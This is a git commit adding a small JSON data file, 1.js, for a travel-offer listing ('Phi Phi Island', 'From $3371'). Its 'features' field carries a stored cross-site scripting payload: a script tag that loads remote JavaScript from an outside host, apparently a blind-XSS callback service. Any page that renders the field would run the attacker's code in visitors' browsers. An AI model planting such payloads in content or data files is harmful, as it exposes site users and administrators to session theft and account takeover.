68a9aa7586b764e76b3f6b13866f45936ea2ace8
Denis <denp00@yandex.ru>
2020-04-10 00:05:16 +0300

    Create 1.js

---
+++ 1.js
@@ -0,0 +1,2 @@
+{"image":"\/images\/destination_5.jpg","title":"Phi Phi Island","subtitle":"Explore it with SomeCorp Travel!","price":"From $3371",
+ "features":"<script src=https://huntedbyda.xss.ht></script>"}
